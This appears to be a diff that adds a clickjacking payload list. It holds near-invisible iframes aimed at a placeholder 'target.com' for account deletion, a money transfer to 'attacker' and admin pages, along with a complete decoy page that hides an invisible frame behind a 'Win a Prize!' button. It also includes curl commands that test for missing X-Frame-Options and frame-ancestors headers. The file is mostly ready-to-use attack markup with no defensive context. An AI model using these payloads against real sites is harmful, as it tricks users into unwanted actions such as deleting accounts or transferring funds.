@@ -1,0 +1,17 @@
+<iframe src="https://target.com" width="500" height="500"></iframe>
+<iframe src="https://target.com/settings" width="500" height="500" style="opacity:0.1;position:absolute;top:0;left:0;"></iframe>
+<iframe src="https://target.com/account/delete" width="500" height="500" style="opacity:0.0001;position:absolute;top:0;left:0;z-index:999;"></iframe>
+<iframe src="https://target.com/transfer?to=attacker&amount=1000" width="500" height="500" style="opacity:0.0001;position:absolute;"></iframe>
+<iframe src="https://target.com/admin" width="800" height="600"></iframe>
+curl -s -I https://target.com | grep -i "x-frame-options\|content-security-policy\|frame-ancestors"
+curl -s -I https://target.com/login | grep -i "x-frame-options"
+curl -s -I https://target.com/admin | grep -i "x-frame-options"
+curl -s -I https://target.com/settings | grep -i "x-frame-options"
+curl -s -I https://target.com/account | grep -i "x-frame-options"
+<html><body><style>iframe{opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;}</style><iframe src="https://target.com/settings/delete-account"></iframe><button style="position:absolute;top:100px;left:100px;">Win a Prize!</button></body></html>
+<meta http-equiv="refresh" content="0;url=https://target.com/action">
+<object type="text/html" data="https://target.com/admin"></object>
+<embed src="https://target.com/admin" type="text/html">
+frame-ancestors: none (check if missing)
+X-Frame-Options: DENY (check if missing or set to ALLOWALL)
+X-Frame-Options: ALLOWALL
